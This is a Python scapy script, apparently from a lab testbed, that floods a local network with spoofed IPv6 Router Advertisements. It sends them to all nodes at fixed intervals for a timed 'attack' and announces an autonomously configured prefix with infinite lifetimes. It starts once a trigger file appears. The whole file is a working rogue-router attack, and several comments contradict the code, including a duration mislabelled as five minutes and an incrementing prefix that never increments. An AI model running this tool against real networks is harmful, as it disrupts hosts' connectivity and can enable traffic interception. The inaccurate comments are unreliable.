import os
import time
from scapy.all import send, get_if_hwaddr, conf
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6NDOptMTU, ICMPv6NDOptSrcLLAddr

# Parameters
ATTACK_DURATION = 30 * 60 # Duration of the attack in seconds (5 minutes)
SEND_INTERVAL = 3  # Duration between sending RAs in seconds
MTU = 1500
INTERFACE = "eth0"
MAC_ADDRESS = get_if_hwaddr(INTERFACE)  # Replace 'conf.iface' if needed with specific interface
PREFIX = "2001:db8::"

conf.iface = INTERFACE

def send_router_advertisements(interface: str, interval : int = SEND_INTERVAL, duration : int = ATTACK_DURATION, prefix : str = PREFIX):
    """
    Sends Router Advertisements at a fixed rate for a specified duration, 
    with an incrementing prefix.

    :param str interface: Network interface to send the advertisements from.
    :param int rate: Number of advertisements to send per second.
    :param int duration: Total time to send advertisements, in seconds.
    """
    # Send packets
    try:
        start_time = time.time()
        end_time = start_time + duration
        i = 0
        while time.time() < end_time:
            # Generate the current prefix

            # Construct the Router Advertisement packet
            ra_packet = IPv6(dst="ff02::1") / \
                        ICMPv6ND_RA() / \
                        ICMPv6NDOptMTU(mtu=MTU) / \
                        ICMPv6NDOptSrcLLAddr(lladdr=MAC_ADDRESS) / \
                        ICMPv6NDOptPrefixInfo(
                            prefixlen=64,
                            prefix=prefix,
                            L=1,  # On-link flag
                            A=1,  # Autonomous address-configuration flag
                            validlifetime=0xFFFFFFFF,
                            preferredlifetime=0xFFFFFFFF
                        )

            # Send the packet
            send(ra_packet, iface=interface, verbose=False)

            # Sleep to maintain the desired rate
            time.sleep(interval)

            # Print progress every interval
            elapsed = time.time() - start_time
            print(f"Sent {(i + 1)} RAs in {elapsed:.2f} seconds...")
            
            i += 1
    except KeyboardInterrupt:
        print("\nStopped sending Router Advertisements.")
        
    print(f"Finished: Sent {i} RAs in {time.time() - start_time:.2f} seconds.")

if __name__ == "__main__":
    trigger_file = "start.trigger"
    # check if the trigger file exists
    while not os.path.exists(trigger_file):
        time.sleep(0.1)
    print("Start sending RAs...")
    
    send_router_advertisements(interface=INTERFACE, interval=SEND_INTERVAL, duration=ATTACK_DURATION, prefix=PREFIX)
